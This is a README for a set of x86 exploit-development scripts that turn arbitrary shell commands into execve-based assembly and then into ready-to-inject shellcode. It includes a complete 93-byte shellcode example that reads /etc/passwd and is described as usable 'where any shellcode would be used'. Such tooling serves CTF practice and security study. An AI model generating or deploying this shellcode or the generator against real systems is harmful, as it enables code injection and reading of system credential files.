reversingtools - x86
====================
x86 Tools and Scripts - Probably don't use on OSX

<strong>packWord.pl</strong> - packs a string into hex, use the -r option for reverse (good for pushing a string to the stack for shellcode)<br>
<strong>doshcommandinssembly.pl</strong> - takes all arguments, converts them to hex, and uses a template to run execve("/bin/sh", ["/bin/sh", "-c", "{your args}", NULL], NULL) to call them in assembly. Outputs program as shl.asm.<br>
<strong>comp_and_dump.sh</strong> - compiles .asm files with nasm, links them with ld, dumps the bytecode with objdump, and turns it into shellcode with the '\x' character in front for quick use. Reads from shl.asm and outputs shl.o and shl (the executable you should test). Now it cleans up the shl.o file and outputs the number of bytes to stderr so you can redirect to a file without getting the byte count in there.<br>
I'll probably update these tools to take in a user supplied output filename (or at the very least cleanup the files after)

<strong>Example:</strong> ./doshcommandinassembly.pl /bin/cat /etc/passwd && ./comp_and_dump.sh<br>
<strong>Output:</strong> \x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x89\xc2\x31\xc0\xb0\xd0\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x68\x2d\x63\x11\x11\x66\x89\x44\x24\x02\x89\xe1\x50\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x20\x2f\x65\x74\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe6\x50\x56\x51\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x89\xc3\xb0\x01\xcd\x80<br>93 Bytes<br>
The output can be used where any shellcode would be used and will print the contents of /etc/passwd to the screen
